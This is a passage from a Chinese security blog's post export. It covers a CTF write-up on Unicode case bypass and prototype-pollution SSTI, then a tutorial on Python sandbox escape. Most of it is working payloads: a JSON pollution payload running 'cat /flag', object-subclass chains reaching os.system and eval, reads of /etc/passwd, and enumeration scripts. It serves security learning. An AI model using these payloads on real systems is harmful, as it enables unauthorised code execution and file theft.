特殊字符绕过 其中混入了两个奇特的字符”ı”、”ſ”。 ​ 这两个字符的“大写”是I和S。也就是说”ı”.toUpperCase() == ‘I’，”ſ”.toUpperCase() == ‘S’。通过这个小特性可以绕过一些限制。 这个”K”的“小写”字符是k，也就是”K”.toLowerCase() == ‘k’. 有一个输入框 你最喜欢的语言，还有提示flag in /flag 登录为admin后，就来到了原型链污染的部分 找污染的参数 123router.get('/info', function (req, res) &#123; res.render('index',data=&#123;'user':res.outputFunctionName&#125;);&#125;) 可以看到在/info下，使用将outputFunctionName渲染入index中，而outputFunctionName是未定义的 1res.outputFunctionName=undefined; 也就是可以通过污染outputFunctionName进行SSTI 于是抓/action的包，Content-Type设为application/json 1&#123;\"lua\":\"a\",\"__proto__\":&#123;\"outputFunctionName\":\"a=1;return global.process.mainModule.constructor._load('child_process').execSync('cat /flag')//\"&#125;,\"Submit\":\"\"&#125; payload参考文章：JavaScript 原型链污染深入理解 JavaScript Prototype 污染攻击JavaScript 原型链污染浅析javascript原型链污染攻击JavaScript原型链污染初探浅析JavaScript原型链污染攻击JavaScript原型链污染初探","categories":[{"name":"web安全","slug":"web安全","permalink":"https://blog.cfyqy.com/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"javascript","slug":"javascript","permalink":"https://blog.cfyqy.com/tags/javascript/"}],"author":"ye1s"},{"title":"python的沙箱逃匿","slug":"python的沙箱逃匿","date":"2020-07-08T14:25:40.000Z","updated":"2021-04-30T06:16:14.416Z","comments":true,"path":"article/b55137d6.html","link":"","permalink":"https://blog.cfyqy.com/article/b55137d6.html","excerpt":"沙箱逃逸就是在在一个严格限制的python环境中，通过绕过限制和过滤达到执行更高权限，甚至getshell的过程 。","text":"沙箱逃逸就是在在一个严格限制的python环境中，通过绕过限制和过滤达到执行更高权限，甚至getshell的过程 。 执行模块执行命令的模块123456ostimeit plarformsubprocessptycommands os模块os，语义为操作系统，模块提供了访问多个操作系统服务的功能，可以处理文件和目录。 1234567os模块import os# 执行shell命令不会返回shell的输出os.system('whoami')# 会产生返回值，可通过read()的方式读取返回值os.popen(\"whoami\").read()commands模块 timeit模块 12import timeittimeit.timeit(\"__import__('os').system('dir')\",number=1) plarform模块 12import platformprint platform.popen('dir').read() subprocess模块 12345678import subprocesssubprocess.call('dir',shell=True)subprocess.Popen('dir', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT).stdout.read()#stdin, stdout, stderr： 分别表示程序标准输入、输出、错误句柄。python3import subprocesssubprocess.run('dir',shell=True) pty模块 123#仅限Linux环境import ptypty.spawn(&quot;ls&quot;) commands模块commands模块会返回命令的输出和执行的状态位，仅限Linux环境 1234import commandscommands.getstatusoutput(&quot;ls&quot;)commands.getoutput(&quot;ls&quot;)commands.getstatus(&quot;ls&quot;) 文件读取的模块1234fileopencodecsfileinput file()函数该函数只存在于Python2，Python3不存在 12file('/etc/passwd').read()file('test.txt','w').write('xxx') open()函数 1open('text.txt').read() codecs模块 12import codecscodecs.open('test.txt').read() 获取当前Python环境信息sys模块 1234import syssys.versionsys.pathsys.modules 执行函数exec()，eval()，execfile()，compile()函数 12345eval('__import__(\"os\").system(\"ls\")')exec('__import__(\"os\").system(\"ls\")')eval()函数只能计算单个表达式的值，而exec()函数可以动态运行代码段。eval()函数可以有返回值，而exec()函数返回值永远为None。compile('a = 1 + 2', '&lt;string&gt;', 'exec') sys模块该模块通过modules()函数引入命令执行模块来实现： 12import syssys.modules[&#39;os&#39;].system(&#39;calc&#39;) 内联函数12345678910# 下面代码可列出所有的内联函数dir(__builtins__)# Python3有一个builtins模块，可以导入builtins模块后通过dir函数查看所有的内联函数import builtinsdir(builtins)dir()函数在没有参数的时候返回本地作用域中的名称列表 在有参数的时候返回该对象的有效属性列表 魔术函数python沙箱逃逸还是离不开继承关系和子父类关系，在查看和使用类的继承，魔法函数起到了不可比拟的作用。 123456789__class__ 返回一个实例所属的类__mro__ 查看类继承的所有父类，直到object__subclasses__() 获取一个类的子类，返回的是一个列表__bases__ 返回一个类直接所继承的类（元组形式）__init__ 类实例创建之后调用, 对当前对象的实例的一些初始化__globals__ 使用方式是 函数名.__globals__，返回一个当前空间下能使用的模块，方法和变量的字典__getattribute__ 当类被调用的时候，无条件进入此函数。__getattr__ 对象中不存在的属性时调用__dict__ 返回所有属性，包括属性，方法等 例子 1234567891011121314151617181920212223242526272829303132333435class A(object): def __init__(self): self.name = \"Bob\" print('ok') def __getattribute__(self,item): print(\"getattribute\") def __getattr__(self): print('getattr')class B(A): passclass C(A): passclass D(B, C): passa=A()print(a.__class__)#__main__.Aprint(D.__mro__)print(B.__subclasses__())print(B.__base__)print(A.__init__.__globals__)print(a.name)print(a.age)result:okgetattributeNone(&lt;class '__main__.D'&gt;, &lt;class '__main__.B'&gt;, &lt;class '__main__.C'&gt;, &lt;class '__main__.A'&gt;, &lt;type 'object'&gt;)[&lt;class '__main__.D'&gt;]&lt;class '__main__.A'&gt;&#123;'A': &lt;class '__main__.A'&gt;, 'a': &lt;__main__.A object at 0x0000000002C00F28&gt;, 'C': &lt;class '__main__.C'&gt;, 'B': &lt;class '__main__.B'&gt;, 'D': &lt;class '__main__.D'&gt;, '__builtins__': &lt;module '__builtin__' (built-in)&gt;, '__file__': 'G:\\\\ctf\\\\test.py', '__package__': None, '__name__': '__main__', '__doc__': None&#125;getattributeNonegetattributeNone object类 对于支持继承的编程语言来说，其方法（属性）可能定义在当前类，也可能来自于基类，所以在方法调用时就需要对当前类和基类进行搜索以确定方法所在的位置。而搜索的顺序就是所谓的「方法解析顺序」（Method Resolution Order，或MRO）。 关于MRO的文章：http://hanjianwei.com/2013/07/25/python-mro/ python的主旨是一切变量皆对象python的object类中集成了很多的基础函数，我们想要调用的时候也是需要用object去操作的，主要是通过__mro__和 __bases__两种方式来创建。__mro__属性获取类的MRO(方法解析顺序)，也就是继承关系。__bases__属性可以获取上一层的继承关系，如果是多层继承则返回上一层的东西，可能有多个。 通过__mro__ 和__bases__两种方式创建object类 12345678().__class__.__bases__[0]&#123;&#125;.__class__.__bases__[0][].__class__.__mro__[1]python3''.__class__.__mro__[1]python2''.__class__.__mro__[2] 然后通过object类的__subclasses__()方法来获得当前环境下能够访问的所有对象，因为调用对象的 __subclasses__() 方法会返回当前环境中所有继承于该对象的对象.。Python2和Python3获取的结果不同。 1&#123;&#125;.__class__.__bases__[0].__subclasses__() 常见的逃匿思路常见逃逸思路当函数被禁用时，就要通过一些类中的关系来引用被禁用的函数。一些常见的寻找特殊模块的方式如下所示: 12345678910* __class__:获得当前对象的类* __bases__ :列出其基类* __mro__ :列出解析方法的调用顺序，类似于bases* __subclasses__()：返回子类列表* __dict__ ： 列出当前属性/函数的字典* func_globals：返回一个包含函数全局变量的字典引用* 从().__class__.__bases__[0].__subclasses__()出发，查看可用的类* 若类中有file，考虑读写操作* 若类中有&lt;class 'warnings.WarningMessage'&gt;，考虑从.__init__.func_globals.values()[13]获取eval，map等等；又或者从.__init__.func_globals[linecache]得到os* 若类中有&lt;type 'file'&gt;，&lt;class 'ctypes.CDLL'&gt;，&lt;class 'ctypes.LibraryLoader'&gt;，考虑构造so文件 获取object类 1234567891011121314151617181920&#39;&#39;.__class__.__mro__[2][].__class__.__mro__[1]&#123;&#125;.__class__.__mro__[1]().__class__.__mro__[1][].__class__.__mro__[-1]&#123;&#125;.__class__.__mro__[-1]().__class__.__mro__[-1]&#123;&#125;.__class__.__bases__[0]().__class__.__bases__[0][].__class__.__bases__[0][].__class__.__base__().__class__.__base__&#123;&#125;.__class__.__base__#python2&#39;&#39;.__class__.__mro__[2]#python3 &#39;&#39;.__class__.__mro__[1] 然后通过object类的__subclasses__()方法获取所有的子类列表 1234567891011[].__class__.__mro__[1].__subclasses__()&#123;&#125;.__class__.__mro__[1].__subclasses__()().__class__.__mro__[1].__subclasses__()&#123;&#125;.__class__.__bases__[0].__subclasses__()().__class__.__bases__[0].__subclasses__()[].__class__.__bases__[0].__subclasses__()#python2''.__class__.__mro__[2].__subclasses__()#python3''.__class__.__mro__[1].__subclasses__() 找到重载过的__init__类，例如： 1[].__class__.__mro__[1].__subclasses__()[59].__init__ 在获取初始化属性后，带wrapper的说明没有重载，寻找不带warpper的，因为wrapper是指这些函数并没有被重载，这时它们并不是function，不具有__globals__属性。写个脚本帮我们来筛选出重载过的init类的类： 1234l=len([].__class__.__mro__[1].__subclasses__())for i in range(l): if 'wrapper' not in str([].__class__.__mro__[1].__subclasses__()[i].__init__): print(i,[].__class__.__mro__[1].__subclasses__()[i]) resultpython2: 12345678(59, &lt;class &#39;warnings.WarningMessage&#39;&gt;)(60, &lt;class &#39;warnings.catch_warnings&#39;&gt;)(61, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;)(62, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;)(72, &lt;class &#39;site._Printer&#39;&gt;)(74, &lt;class &#39;site.Quitter&#39;&gt;)(75, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;)(76, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;) python3: 12345678910111213141516171864 &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt;65 &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt;66 &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt;67 &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt;68 &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt;79 &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt;80 &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt;81 &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt;83 &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt;92 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;93 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;94 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt;95 &lt;class &#39;codecs.StreamRecoder&#39;&gt;96 &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;97 &lt;class &#39;_weakrefset.WeakSet&#39;&gt;118 &lt;class &#39;os._wrap_close&#39;&gt;119 &lt;class &#39;_sitebuiltins.Quitter&#39;&gt;120 &lt;class &#39;_sitebuiltins._Printer&#39;&gt; 重载过的init类的类具有globals属性，这里以WarningMessage为例，会返回很多dict类型： 12345#python2[].__class__.__mro__[1].__subclasses__()[59].__init__.__globals__#python3[].__class__.__mro__[1].__subclasses__()[64].__init__.__globals__ 寻找keys中的builtins来查看引用，这里同样会返回很多dict类型： 12#python2 [].__class__.__mro__[1].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;] 再在keys中寻找可利用的函数即可，如file()函数为例： 12#python2[].__class__.__mro__[1].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;E:&#x2F;passwd.txt&#39;).read() 至此，整个元素链调用的构造过程就走了一遍了，下面看看还有哪些可利用的函数。使用脚本遍历其他逃逸方法Python2的脚本如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173# coding=UTF-8find_modules = &#123;'filecmp': ['os', '__builtins__'], 'heapq': ['__builtins__'], 'code': ['sys', '__builtins__'], 'hotshot': ['__builtins__'], 'distutils': ['sys', '__builtins__'], 'functools': ['__builtins__'], 'random': ['__builtins__'], 'tty': ['sys', '__builtins__'], 'subprocess': ['os', 'sys', '__builtins__'], 'sysconfig': ['os', 'sys', '__builtins__'], 'whichdb': ['os', 'sys', '__builtins__'], 'runpy': ['sys', '__builtins__'], 'pty': ['os', 'sys', '__builtins__'], 'plat-atheos': ['os', 'sys', '__builtins__'], 'xml': ['__builtins__'], 'sgmllib': ['__builtins__'], 'importlib': ['sys', '__builtins__'], 'UserList': ['__builtins__'], 'tempfile': ['__builtins__'], 'mimify': ['sys', '__builtins__'], 'pprint': ['__builtins__'], 'platform': ['os', 'platform', 'sys', '__builtins__'], 'collections': ['__builtins__'], 'cProfile': ['__builtins__'], 'smtplib': ['__builtins__'], 'compiler': ['__builtins__', 'compile'], 'string': ['__builtins__'], 'SocketServer': ['os', 'sys', '__builtins__'], 'plat-darwin': ['os', 'sys', '__builtins__'], 'zipfile': ['os', 'sys', '__builtins__'], 'repr': ['__builtins__'], 'wave': ['sys', '__builtins__', 'open'], 'curses': ['__builtins__'], 'antigravity': ['__builtins__'], 'plat-irix6': ['os', 'sys', '__builtins__'], 'plat-freebsd6': ['os', 'sys', '__builtins__'], 'plat-freebsd7': ['os', 'sys', '__builtins__'], 'plat-freebsd4': ['os', 'sys', '__builtins__'], 'plat-freebsd5': ['os', 'sys', '__builtins__'], 'plat-freebsd8': ['os', 'sys', '__builtins__'], 'aifc': ['__builtins__', 'open'], 'sndhdr': ['__builtins__'], 'cookielib': ['__builtins__'], 'ConfigParser': ['__builtins__'], 'httplib': ['os', '__builtins__'], '_MozillaCookieJar': ['sys', '__builtins__'], 'bisect': ['__builtins__'], 'decimal': ['__builtins__'], 'cmd': ['__builtins__'], 'binhex': ['os', 'sys', '__builtins__'], 'sunau': ['__builtins__', 'open'], 'pydoc': ['os', 'sys', '__builtins__'], 'plat-riscos': ['os', 'sys', '__builtins__'], 'token': ['__builtins__'], 'Bastion': ['__builtins__'], 'msilib': ['os', 'sys', '__builtins__'], 'shlex': ['os', 'sys', '__builtins__'], 'quopri': ['__builtins__'], 'multiprocessing': ['os', 'sys', '__builtins__'], 'dummy_threading': ['__builtins__'], 'dircache': ['os', '__builtins__'], 'asyncore': ['os', 'sys', '__builtins__'], 'pkgutil': ['os', 'sys', '__builtins__'], 'compileall': ['os', 'sys', '__builtins__'], 'SimpleHTTPServer': ['os', 'sys', '__builtins__'], 'locale': ['sys', '__builtins__'], 'chunk': ['__builtins__'], 'macpath': ['os', '__builtins__'], 'popen2': ['os', 'sys', '__builtins__'], 'mimetypes': ['os', 'sys', '__builtins__'], 'toaiff': ['os', '__builtins__'], 'atexit': ['sys', '__builtins__'], 'pydoc_data': ['__builtins__'], 'tabnanny': ['os', 'sys', '__builtins__'], 'HTMLParser': ['__builtins__'], 'encodings': ['codecs', '__builtins__'], 'BaseHTTPServer': ['sys', '__builtins__'], 'calendar': ['sys', '__builtins__'], 'mailcap': ['os', '__builtins__'], 'plat-unixware7': ['os', 'sys', '__builtins__'], 'abc': ['__builtins__'], 'plistlib': ['__builtins__'], 'bdb': ['os', 'sys', '__builtins__'], 'py_compile': ['os', 'sys', '__builtins__', 'compile'], 'pipes': ['os', '__builtins__'], 'rfc822': ['__builtins__'], 'tarfile': ['os', 'sys', '__builtins__', 'open'], 'struct': ['__builtins__'], 'urllib': ['os', 'sys', '__builtins__'], 'fpformat': ['__builtins__'], 're': ['sys', '__builtins__', 'compile'], 'mutex': ['__builtins__'], 'ntpath': ['os', 'sys', '__builtins__'], 'UserString': ['sys', '__builtins__'], 'new': ['__builtins__'], 'formatter': ['sys', '__builtins__'], 'email': ['sys', '__builtins__'], 'cgi': ['os', 'sys', '__builtins__'], 'ftplib': ['os', 'sys', '__builtins__'], 'plat-linux2': ['os', 'sys', '__builtins__'], 'ast': ['__builtins__'], 'optparse': ['os', 'sys', '__builtins__'], 'UserDict': ['__builtins__'], 'inspect': ['os', 'sys', '__builtins__'], 'mailbox': ['os', 'sys', '__builtins__'], 'Queue': ['__builtins__'], 'fnmatch': ['__builtins__'], 'ctypes': ['__builtins__'], 'codecs': ['sys', '__builtins__', 'open'], 'getopt': ['os', '__builtins__'], 'md5': ['__builtins__'], 'cgitb': ['os', 'sys', '__builtins__'], 'commands': ['__builtins__'], 'logging': ['os', 'codecs', 'sys', '__builtins__'], 'socket': ['os', 'sys', '__builtins__'], 'plat-irix5': ['os', 'sys', '__builtins__'], 'sre': ['__builtins__', 'compile'], 'ensurepip': ['os', 'sys', '__builtins__'], 'DocXMLRPCServer': ['sys', '__builtins__'], 'traceback': ['sys', '__builtins__'], 'netrc': ['os', '__builtins__'], 'wsgiref': ['__builtins__'], 'plat-generic': ['os', 'sys', '__builtins__'], 'weakref': ['__builtins__'], 'ihooks': ['os', 'sys', '__builtins__'], 'telnetlib': ['sys', '__builtins__'], 'doctest': ['os', 'sys', '__builtins__'], 'pstats': ['os', 'sys', '__builtins__'], 'smtpd': ['os', 'sys', '__builtins__'], '_pyio': ['os', 'codecs', 'sys', '__builtins__', 'open'], 'dis': ['sys', '__builtins__'], 'os': ['sys', '__builtins__', 'open'], 'pdb': ['os', 'sys', '__builtins__'], 'this': ['__builtins__'], 'base64': ['__builtins__'], 'os2emxpath': ['os', '__builtins__'], 'glob': ['os', 'sys', '__builtins__'], 'unittest': ['__builtins__'], 'dummy_thread': ['__builtins__'], 'fileinput': ['os', 'sys', '__builtins__'], '__future__': ['__builtins__'], 'robotparser': ['__builtins__'], 'plat-mac': ['os', 'sys', '__builtins__'], '_threading_local': ['__builtins__'], '_LWPCookieJar': ['sys', '__builtins__'], 'wsgiref.egg-info': ['os', 'sys', '__builtins__'], 'sha': ['__builtins__'], 'sre_constants': ['__builtins__'], 'json': ['__builtins__'], 'Cookie': ['__builtins__'], 'tokenize': ['__builtins__'], 'plat-beos5': ['os', 'sys', '__builtins__'], 'rexec': ['os', 'sys', '__builtins__'], 'lib-tk': ['__builtins__'], 'textwrap': ['__builtins__'], 'fractions': ['__builtins__'], 'sqlite3': ['__builtins__'], 'posixfile': ['__builtins__', 'open'], 'imaplib': ['subprocess', 'sys', '__builtins__'], 'xdrlib': ['__builtins__'], 'imghdr': ['__builtins__'], 'macurl2path': ['os', '__builtins__'], '_osx_support': ['os', 'sys', '__builtins__'], 'webbrowser': ['os', 'subprocess', 'sys', '__builtins__', 'open'], 'plat-netbsd1': ['os', 'sys', '__builtins__'], 'nturl2path': ['__builtins__'], 'tkinter': ['__builtins__'], 'copy': ['__builtins__'], 'pickletools': ['__builtins__'], 'hashlib': ['__builtins__'], 'anydbm': ['__builtins__', 'open'], 'keyword': ['__builtins__'], 'timeit': ['timeit', 'sys', '__builtins__'], 'uu': ['os', 'sys', '__builtins__'], 'StringIO': ['__builtins__'], 'modulefinder': ['os', 'sys', '__builtins__'], 'stringprep': ['__builtins__'], 'markupbase': ['__builtins__'], 'colorsys': ['__builtins__'], 'shelve': ['__builtins__', 'open'], 'multifile': ['__builtins__'], 'sre_parse': ['sys', '__builtins__'], 'pickle': ['sys', '__builtins__'], 'plat-os2emx': ['os', 'sys', '__builtins__'], 'mimetools': ['os', 'sys', '__builtins__'], 'audiodev': ['__builtins__'], 'copy_reg': ['__builtins__'], 'sre_compile': ['sys', '__builtins__', 'compile'], 'CGIHTTPServer': ['os', 'sys', '__builtins__'], 'idlelib': ['__builtins__'], 'site': ['os', 'sys', '__builtins__'], 'getpass': ['os', 'sys', '__builtins__'], 'imputil': ['sys', '__builtins__'], 'bsddb': ['os', 'sys', '__builtins__'], 'contextlib': ['sys', '__builtins__'], 'numbers': ['__builtins__'], 'io': ['__builtins__', 'open'], 'plat-sunos5': ['os', 'sys', '__builtins__'], 'symtable': ['__builtins__'], 'pyclbr': ['sys', '__builtins__'], 'shutil': ['os', 'sys', '__builtins__'], 'lib2to3': ['__builtins__'], 'threading': ['__builtins__'], 'dbhash': ['sys', '__builtins__', 'open'], 'gettext': ['os', 'sys', '__builtins__'], 'dumbdbm': ['__builtins__', 'open'], '_weakrefset': ['__builtins__'], '_abcoll': ['sys', '__builtins__'], 'MimeWriter': ['__builtins__'], 'test': ['__builtins__'], 'opcode': ['__builtins__'], 'csv': ['__builtins__'], 'nntplib': ['__builtins__'], 'profile': ['os', 'sys', '__builtins__'], 'genericpath': ['os', '__builtins__'], 'stat': ['__builtins__'], '__phello__.foo': ['__builtins__'], 'sched': ['__builtins__'], 'statvfs': ['__builtins__'], 'trace': ['os', 'sys', '__builtins__'], 'warnings': ['sys', '__builtins__'], 'symbol': ['__builtins__'], 'sets': ['__builtins__'], 'htmlentitydefs': ['__builtins__'], 'urllib2': ['os', 'sys', '__builtins__'], 'SimpleXMLRPCServer': ['os', 'sys', '__builtins__'], 'sunaudio': ['__builtins__'], 'pdb.doc': ['os', '__builtins__'], 'asynchat': ['__builtins__'], 'user': ['os', '__builtins__'], 'xmllib': ['__builtins__'], 'codeop': ['__builtins__'], 'plat-next3': ['os', 'sys', '__builtins__'], 'types': ['__builtins__'], 'argparse': ['__builtins__'], 'uuid': ['os', 'sys', '__builtins__'], 'plat-aix4': ['os', 'sys', '__builtins__'], 'plat-aix3': ['os', 'sys', '__builtins__'], 'ssl': ['os', 'sys', '__builtins__'], 'poplib': ['__builtins__'], 'xmlrpclib': ['__builtins__'], 'difflib': ['__builtins__'], 'urlparse': ['__builtins__'], 'linecache': ['os', 'sys', '__builtins__'], '_strptime': ['__builtins__'], 'htmllib': ['__builtins__'], 'site-packages': ['__builtins__'], 'posixpath': ['os', 'sys', '__builtins__'], 'stringold': ['__builtins__'], 'gzip': ['os', 'sys', '__builtins__', 'open'], 'mhlib': ['os', 'sys', '__builtins__'], 'rlcompleter': ['__builtins__'], 'hmac': ['__builtins__']&#125;target_modules = ['os', 'platform', 'subprocess', 'timeit', 'importlib', 'codecs', 'sys']target_functions = ['__import__', '__builtins__', 'exec', 'eval', 'execfile', 'compile', 'file', 'open']all_targets = list(set(find_modules.keys() + target_modules + target_functions))all_modules = list(set(find_modules.keys() + target_modules))subclasses = ().__class__.__bases__[0].__subclasses__()sub_name = [s.__name__ for s in subclasses]# 第一种遍历,如:().__class__.__bases__[0].__subclasses__()[40]('./test.py').read()print('----------1-----------')for i, s in enumerate(sub_name): for f in all_targets: if f == s: if f in target_functions: print(i, f) elif f in all_modules: target = find_modules[f] sub_dict = subclasses[i].__dict__ for t in target: if t in sub_dict: print(i, f, target)print('----------2-----------')# 第二种遍历,如:().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('ls')for i, sub in enumerate(subclasses): try: more = sub.__init__.func_globals for m in all_targets: if m in more: print(i, sub, m, find_modules.get(m)) except Exception as e: passprint('----------3-----------')# 第三种遍历,如:().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__(\"os\").system(\"ls\")')for i, sub in enumerate(subclasses): try: more = sub.__init__.func_globals.values() for j, v in enumerate(more): for f in all_targets: try: if f in v: if f in target_functions: print(i, j, sub, f) elif f in all_modules: target = find_modules.get(f) sub_dict = v[f].__dict__ for t in target: if t in sub_dict: print(i, j, sub, f, target) except Exception as e: pass except Exception as e: passprint('----------4-----------')# 第四种遍历:如:().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__'](\"os\").system(\"ls\")# &lt;class 'warnings.catch_warnings'&gt;类很特殊，在内部定义了_module=sys.modules['warnings']，然后warnings模块包含有__builtins__，不具有通用性，本质上跟第一种方法类似for i, sub in enumerate(subclasses): try: more = sub()._module.__builtins__ for f in all_targets: if f in more: print(i, f) except Exception as e: pass 下面简单归纳下遍历的4种方式： 第一种方式 序号为40，即file()函数，进行文件读取和写入，payload如下： 12''.__class__.__mro__[2].__subclasses__()[40]('E:/passwd').read()''.__class__.__mro__[2].__subclasses__()[40]('E:/test.txt', 'w').write('xxx') 这和前面元素链构造时给出的Demo有点区别： 1''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['file']('E:/passwd').read() 序号59是WarningMessage类，其具有globals属性，包含builtins，其中含有file()函数，属于第二种方式；而这里是直接在object类的所有子类中直接找到了file()函数的序号为40，直接调用即可。第二种方式 先看序号为59的WarningMessage类有哪些而利用的模块或方法： 1234(59, &lt;class 'warnings.WarningMessage'&gt;, 'linecache', ['os', 'sys', '__builtins__'])(59, &lt;class 'warnings.WarningMessage'&gt;, '__builtins__', None)(59, &lt;class 'warnings.WarningMessage'&gt;, 'sys', None)(59, &lt;class 'warnings.WarningMessage'&gt;, 'types', ['__builtins__']) 以linecache中的os为例，这里简单解释下工具的寻找过程依次如下： 1234567891011121314# 确认linecache''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['linecache']# 返回linecache字典中的所有键''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['linecache'].__dict__.keys()# 在linecache字典的所有键中寻找os的序号，找到为12''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['linecache'].__dict__.keys().index('os')# 更换keys()为values()，访问12序号的元素，并获取该os字典的所有键''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['linecache'].__dict__.values()[12].__dict__.keys()# 在os字典的所有键中寻找system的序号，找到为79''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['linecache'].__dict__.values()[12].__dict__.keys().index('system')# 执行os.system()''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['linecache'].__dict__.values()[12].__dict__.values()[79]('calc') payload如下： 123456789101112131415161718# linecache利用''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['linecache'].__dict__['os'].system('calc')''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['linecache'].__dict__['sys'].modules['os'].system('calc')''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['linecache'].__dict__['__builtins__']['__import__']('os').system('calc')# __builtins__利用，包括__import__、file、open、execfile、eval、结合exec的compile等''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').system('calc')''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['file']('E:/passwd').read()''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['open']('E:/test.txt', 'w').write('hello')''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['execfile']('E:/exp.py')''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__(\"os\").system(\"calc\")')exec(''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['compile']('__import__(\"os\").system(\"calc\")', '&lt;string&gt;', 'exec'))# sys利用''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['sys'].modules['os'].system('calc')# types利用，后面还是通过__builtins__实现利用''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['types'].__dict__['__builtins__']['__import__']('os').system('calc') 序号为60的catch_warnings类利用payload同上。 序号为61、62的两个类均只有__builtins__可利用，利用payload同上。 序号为72、77的两个类_Printer和Quitter，相比前面的，没见过的有os和traceback，但只有os模块可利用： 12# os利用''.__class__.__mro__[2].__subclasses__()[72].__init__.__globals__['os'].system('calc') 序号为78、79的两个类IncrementalEncoder和IncrementalDecoder，相比前面的，没见过的有open： 123# open利用&#39;&#39;.__class__.__mro__[2].__subclasses__()[78].__init__.__globals__[&#39;open&#39;](&#39;E:&#x2F;passwd&#39;).read()&#39;&#39;.__class__.__mro__[2].__subclasses__()[78].__init__.__globals__[&#39;open&#39;](&#39;E:&#x2F;test.txt&#39;, &#39;w&#39;).write() 第三种方式先看下序号为59的WarningMessage类： 123456(59, 13, &lt;class 'warnings.WarningMessage'&gt;, '__import__')(59, 13, &lt;class 'warnings.WarningMessage'&gt;, 'file')(59, 13, &lt;class 'warnings.WarningMessage'&gt;, 'compile')(59, 13, &lt;class 'warnings.WarningMessage'&gt;, 'eval')(59, 13, &lt;class 'warnings.WarningMessage'&gt;, 'open')(59, 13, &lt;class 'warnings.WarningMessage'&gt;, 'execfile') 注意是通过values()函数中的数组序号来填写第二个数值实现调用，以下以eval为示例，其他的利用payload和前面的差不多就不再赘述了： 1&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__.values()[13][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).system(&quot;calc&quot;)&#39;) 其他类似修改即可。 第四种方式 这里只有一种序号，为60： 1234567(60, '__import__')(60, 'file')(60, 'repr')(60, 'compile')(60, 'eval')(60, 'open')(60, 'execfile') 调用示例如下，其他类似修改即可： 1''.__class__.__mro__[2].__subclasses__()[60]()._module.__builtins__['__import__'](\"os\").system(\"calc\") python3 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150# coding=UTF-8# Python3find_modules = &#123;'asyncio': ['subprocess', 'sys', '__builtins__'], 'collections': ['__builtins__'], 'concurrent': ['__builtins__'], 'ctypes': ['__builtins__'], 'curses': ['__builtins__'], 'dbm': ['os', 'sys', '__builtins__', 'open'], 'distutils': ['sys', '__builtins__'], 'email': ['__builtins__'], 'encodings': ['codecs', 'sys', '__builtins__'], 'ensurepip': ['os', 'sys', '__builtins__'], 'html': ['__builtins__'], 'http': ['__builtins__'], 'idlelib': ['__builtins__'], 'importlib': ['sys', '__import__', '__builtins__'], 'json': ['codecs', '__builtins__'], 'lib2to3': ['__builtins__'], 'logging': ['os', 'sys', '__builtins__'], 'msilib': ['os', 'sys', '__builtins__'], 'multiprocessing': ['sys', '__builtins__'], 'pydoc_data': ['__builtins__'], 'sqlite3': ['__builtins__'], 'test': ['__builtins__'], 'tkinter': ['sys', '__builtins__'], 'turtledemo': ['__builtins__'], 'unittest': ['__builtins__'], 'urllib': ['__builtins__'], 'venv': ['os', 'subprocess', 'sys', '__builtins__'], 'wsgiref': ['__builtins__'], 'xml': ['__builtins__'], 'xmlrpc': ['__builtins__'], '__future__': ['__builtins__'], '__phello__.foo': ['__builtins__'], '_bootlocale': ['sys', '__builtins__'], '_collections_abc': ['sys', '__builtins__'], '_compat_pickle': ['__builtins__'], '_compression': ['__builtins__'], '_dummy_thread': 